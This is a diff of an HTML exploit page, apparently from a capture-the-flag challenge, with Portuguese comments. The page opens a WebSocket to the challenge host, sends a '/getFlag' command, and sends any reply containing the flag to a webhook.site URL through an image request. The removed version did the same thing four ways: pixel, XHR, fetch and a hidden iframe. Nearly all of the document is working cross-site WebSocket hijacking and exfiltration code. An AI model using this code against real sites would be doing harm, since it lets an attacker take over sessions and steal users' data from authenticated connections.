@@ -1,103 +1,30 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>WebSocket Flag Capture</title>
+    <title>Simple Exploit</title>
 </head>
 <body>
-    <h1>WebSocket Flag Capture</h1>
-    <div id="status">Conectando...</div>
+    <h1>Flag Capture</h1>
     
     <script>
-        // Seu webhook
-        const webhookURL = "https://webhook.site/849b249a-8980-4038-9d90-9fbaa89dc2f8";
+        // Conectar imediatamente ao WebSocket
+        const socket = new WebSocket('wss://wembsoncket.chal.cyberjousting.com');
         
-        // Função para exfiltrar dados de várias maneiras
-        function exfiltrateData(data) {
-            // Método 1: Imagem (pixel de rastreamento)
-            const img = new Image();
-            img.src = webhookURL + "?flag=" + encodeURIComponent(data) + "&method=img&time=" + new Date().getTime();
-            document.body.appendChild(img);
-            
-            // Método 2: XMLHttpRequest (mais compatível que fetch)
-            try {
-                const xhr = new XMLHttpRequest();
-                xhr.open("GET", webhookURL + "?flag=" + encodeURIComponent(data) + "&method=xhr&time=" + new Date().getTime(), true);
-                xhr.send();
-            } catch(e) {
-                console.error("XHR falhou:", e);
-            }
-            
-            // Método 3: fetch API
-            try {
-                fetch(webhookURL + "?flag=" + encodeURIComponent(data) + "&method=fetch&time=" + new Date().getTime())
-                    .catch(err => console.error("Fetch falhou:", err));
-            } catch(e) {
-                console.error("Fetch falhou:", e);
-            }
-            
-            // Método 4: Iframe
-            try {
-                const iframe = document.createElement('iframe');
-                iframe.style.display = 'none';
-                iframe.src = webhookURL + "?flag=" + encodeURIComponent(data) + "&method=iframe&time=" + new Date().getTime();
-                document.body.appendChild(iframe);
-            } catch(e) {
-                console.error("Iframe falhou:", e);
-            }
-        }
+        socket.onopen = function() {
+            // Enviar comando para obter a flag
+            socket.send(JSON.stringify({ sender: 'user', message: '/getFlag' }));
+        };
         
-        // Conectar ao WebSocket imediatamente
-        try {
-            const socket = new WebSocket('wss://wembsoncket.chal.cyberjousting.com');
+        socket.onmessage = function(event) {
+            const data = JSON.parse(event.data);
             
-            socket.onopen = function() {
-                document.getElementById('status').textContent = "Conectado! Enviando comando...";
-                exfiltrateData("websocket_connected");
-                
-                // Enviar comando imediatamente e novamente após um atraso
-                socket.send(JSON.stringify({ sender: 'user', message: '/getFlag' }));
-                
-                // Tente novamente após 500ms para garantir
-                setTimeout(function() {
-                    socket.send(JSON.stringify({ sender: 'user', message: '/getFlag' }));
-                }, 500);
-            };
-            
-            socket.onmessage = function(event) {
-                try {
-                    const data = JSON.parse(event.data);
-                    document.getElementById('status').textContent = "Resposta recebida: " + data.message;
-                    
-                    // Exfiltrar qualquer mensagem recebida
-                    exfiltrateData("message_" + data.message);
-                    
-                    // Se contiver a flag, exfiltrar especificamente como flag
-                    if (data.message && data.message.includes('Flag:')) {
-                        exfiltrateData("FLAG_FOUND_" + data.message);
-                    }
-                } catch(e) {
-                    exfiltrateData("parse_error_" + e.message);
-                }
-            };
-            
-            socket.onerror = function(error) {
-                document.getElementById('status').textContent = "Erro: " + error;
-                exfiltrateData("websocket_error");
-            };
-            
-            socket.onclose = function() {
-                document.getElementById('status').textContent = "Conexão fechada";
-                exfiltrateData("websocket_closed");
-            };
-            
-        } catch(e) {
-            document.getElementById('status').textContent = "Erro ao inicializar: " + e.message;
-            exfiltrateData("init_error_" + e.message);
-        }
-        
-        // Exfiltrar informação de que a página foi carregada
-        window.onload = function() {
-            exfiltrateData("page_loaded");
+            // Se contiver a flag, exfiltrar via imagem
+            if (data.message && data.message.includes('Flag:')) {
+                const img = new Image();
+                img.src = "https://webhook.site/849b249a-8980-4038-9d90-9fbaa89dc2f8?flag=" + 
+                          encodeURIComponent(data.message);
+                document.body.appendChild(img);
+            }
         };
     </script>
 </body>
